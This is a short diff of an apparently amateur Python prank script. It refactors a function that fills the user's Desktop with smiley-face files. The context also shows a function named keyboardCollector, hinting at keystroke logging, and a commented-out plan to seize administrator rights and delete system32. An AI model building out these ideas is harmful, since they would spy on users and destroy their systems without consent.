@@ -40,8 +40,7 @@ def keyboardCollector():
 #    log = ""
 
 
-def smileTime(): #Create files on the desktop that all have a smiley face in them.
-    desktop = os.path.expanduser("~/Desktop") #Expands the path to the before part of the ~.
+def smileTime(desktop): #Create files on the desktop that all have a smiley face in them.
     
     for i in range(10):
         smile = random.choice(['''
@@ -81,4 +80,5 @@ def smileTime(): #Create files on the desktop that all have a smiley face in the
 
 #def wannaGame(): try to get administrator privilages and if not just run this as an administrator, but play a quick game and if they lose, then delete system32
 
-smileTime()
+desktop = os.path.expanduser("~/Desktop") #Expands the path to the before part of the ~.
+smileTime(desktop)
